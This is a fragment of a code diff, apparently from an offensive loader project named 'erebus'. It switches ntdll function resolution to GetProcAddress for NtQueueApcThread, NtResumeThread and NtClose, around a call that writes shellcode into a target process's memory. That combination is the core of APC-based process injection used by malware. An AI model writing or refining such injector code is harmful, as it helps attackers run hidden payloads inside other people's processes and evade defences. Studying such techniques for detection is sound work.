@@ -8,10 +8,11 @@ namespace erebus {
 
 		PVOID base_address = NULL;
 
-		HMODULE ntdll = ImportModule("ntdll.dll");
-		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
-		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
-		ImportFunction(ntdll, NtClose, typeNtClose);
+		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
+		typeNtQueueApcThread NtQueueApcThread = (typeNtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
+		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
+		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");
 
 		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
 		if (base_address == NULL) {
